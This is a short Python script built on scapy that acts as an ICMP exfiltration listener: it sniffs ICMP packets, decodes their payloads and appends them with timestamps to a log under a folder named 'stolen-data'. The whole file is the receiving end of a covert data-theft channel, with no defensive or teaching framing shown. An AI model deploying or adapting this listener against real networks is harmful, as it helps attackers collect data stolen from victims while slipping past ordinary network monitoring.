#!/usr/bin/env python3
from scapy.all import *
from datetime import datetime

def process_icmp_data(packet):
    if packet.haslayer(ICMP) and packet.haslayer(Raw):
        data = packet[Raw].load.decode('utf-8', errors='ignore')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open("/root/stolen-data/exfil.log", "a") as f:
            f.write(f"[{timestamp}] {data}\n")
        
        print(f"[RECEIVED] {data[:100]}...")  # Print first 100 chars

print("[*] ICMP Exfiltration Listener Active...")
sniff(filter="icmp", prn=process_icmp_data)